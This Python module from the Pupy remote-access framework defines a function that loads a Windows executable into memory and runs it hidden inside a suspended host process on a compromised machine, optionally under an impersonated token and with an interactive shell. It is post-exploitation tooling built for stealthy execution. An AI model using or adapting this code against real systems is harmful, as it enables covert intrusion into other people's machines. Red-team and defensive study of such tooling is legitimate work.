#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from pupylib.utils.pe import get_pe_arch
from modules.lib.utils.cmdrepl import CmdRepl
import threading

def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_impersonation=False, suspended_process="cmd.exe", codepage=None):
    if not raw_pe and not path:
        raise Exception("raw_pe or path must be supplied")

    if path:
        pe_arch = get_pe_arch(path)
        proc_arch = module.client.desc["proc_arch"]
        if pe_arch != proc_arch:
            module.error(
                '%s is a %s PE and your pupy payload is a %s process. '
                'Please inject a %s PE or migrate into a %s process first'%(
                    path, pe_arch, proc_arch, proc_arch, pe_arch))

            return

    if not raw_pe:
        raw_pe = b''
        with open(path,'rb') as f:
            raw_pe = f.read()

    dupHandle = None
    if use_impersonation:
        dupHandle = module.client.impersonated_dupHandle
        if dupHandle is None:
            module.error('No token has been impersonated on this session. use impersonate module first')
            return

    if not hasattr(module, 'mp'):
        setattr(module, 'mp', None)

    module.mp = module.client.conn.modules[
        'pupwinutils.memexec'
    ].MemoryPE(
        raw_pe, args=prog_args, hidden=True,
        suspended_process=suspended_process,
        dupHandle=dupHandle
    )

    complete = threading.Event()

    if interactive:
        repl, _ = CmdRepl.thread(
            module.stdout,
            module.mp.write,
            complete,
            True, None,
            codepage
        )

        module.client.conn.register_remote_cleanup(
            module.mp.close
        )

        if module.mp.execute(complete.set, repl._con_write):
            complete.wait()
            module.mp.close()

            module.client.conn.unregister_remote_cleanup(
                module.mp.close
            )

            module.success('Process exited. Press ENTER')
        else:
            complete.set()
            module.error('Launch failed. Press ENTER')
    else:
        pid = module.mp.execute(complete.set, None)
        if pid:
            complete.wait()
            module.success('[Process launched: PID={}]'.format(pid))
        else:
            module.error('Launch failed')


    return module.mp.stdout
